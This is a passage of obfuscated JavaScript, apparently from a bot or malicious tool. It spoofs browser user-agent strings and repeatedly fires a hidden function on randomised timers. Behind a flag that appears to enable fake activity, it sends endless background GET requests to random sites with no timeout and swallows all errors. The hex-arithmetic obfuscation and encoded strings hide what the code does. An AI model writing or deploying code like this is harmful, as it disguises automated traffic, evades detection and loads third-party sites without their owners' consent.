      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x15c9 + -0x4 * -0x6d + -0x35b * 0x7; k < -0x1496 + 0x1ce1 + -0x847; k++)
    setTimeout(f, (0x13849 + -0x19352 + -0x4115 * -0x5) * k * getRandomInt(0x2093 + -0x1016 + -0x34c * 0x5, -0xc + 0x173 + 0x1 * -0x164));
  setInterval(() => {
    f();
    for (let l = -0xc6b * -0x1 + 0x16c9 + 0x5de * -0x6; l < 0xa4 * 0x18 + -0x1f5e + 0x1002; l++)
      setTimeout(f, (-0x2 * -0x2bef + -0x6a98 + -0x545e * -0x3) * l * getRandomInt(-0x2b4 * 0xe + -0x2 * -0x2eb + -0x2e9 * -0xb, -0x1b * -0x89 + -0x4 * 0x2c7 + -0x47 * 0xc));
  }, -0x15c487 + -0x1f62d * -0x15 + 0x238156);
})()), doFlags[a0(0x18, 'aFzX') + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x169a + -0x2773 + 0x5965) * getRandomInt(-0xc7f + 0xfb7 + -0x337, -0x785 + -0x2495 + 0x8d3 * 0x5));
}, 0x1b2f + 0x1e3 * -0x3 + 0x21d * -0xa);